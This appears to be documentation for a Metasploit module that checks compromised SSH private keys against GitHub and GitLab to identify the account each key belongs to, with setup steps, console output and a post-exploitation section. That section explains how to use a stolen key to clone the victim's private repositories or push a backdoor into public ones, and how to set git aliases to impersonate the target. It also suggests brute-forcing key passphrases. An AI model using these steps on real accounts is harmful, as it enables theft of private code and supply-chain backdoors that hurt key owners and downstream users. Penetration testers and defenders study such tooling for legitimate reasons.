## Introduction

This module attempts to authenticate to Git servers using compromised SSH private keys. This module can be used to check a single key or recursively look through a directory. It will not attempt to check keys that have a passphrase, however a bruteforce attack could be launched on a key and then the passphrase could be disabled.

## Setup

1. `ssh-keygen -b 2048 -t rsa`
2. Add the RSA pubic key to a GitHub or GitLab account (Public ends in .pub)
3. Follow the usage instructions below
4. Either use KEY_FILE or KEY_DIR to specify the generated SSH private key
5. Run the module
6. Observe that it will identify the GitHub/GitLab user that this key belongs to

## Usage

```
msf5 > use auxiliary/scanner/ssh/ssh_enum_git_keys
msf5 auxiliary(scanner/ssh/ssh_enum_git_keys) > set KEY_DIR /Users/w/.ssh
KEY_DIR => /Users/w/.ssh
msf5 auxiliary(scanner/ssh/ssh_enum_git_keys) > run

Git Access Data
===============

Key Location              User Access
------------              -----------
/Users/w/.ssh/id_ed25519  wdahlenburg

[*] Auxiliary module execution completed
```
## Post Exploitation

Once you have identified a Git user from an SSH key, there are two immediate possibilities.

1. Download private repositories that the owner knows
2. Modify public repositories and inject a backdoor

To begin either, the valid keys will need to be added to the current `~/.ssh/config`.

Example: Using a valid key at /Users/w/.ssh/id_ed25519

1. Write the following to `~/.ssh/config`
`Host github
    User git
    Hostname github.com
    PreferredAuthentications publickey
    IdentityFile /Users/w/.ssh/id_ed25519
    `
2. Clone a repo using the key
` $ git clone github:<username>/Repo.git`
3. Alternatively, modify an existing local repo by modifying the .git/config file
```
...
[remote "origin"]
    url = github:username/reponame.git
...

```
4. Any changes will be pushed using the specified key. Make sure you set the git aliases to match your target.
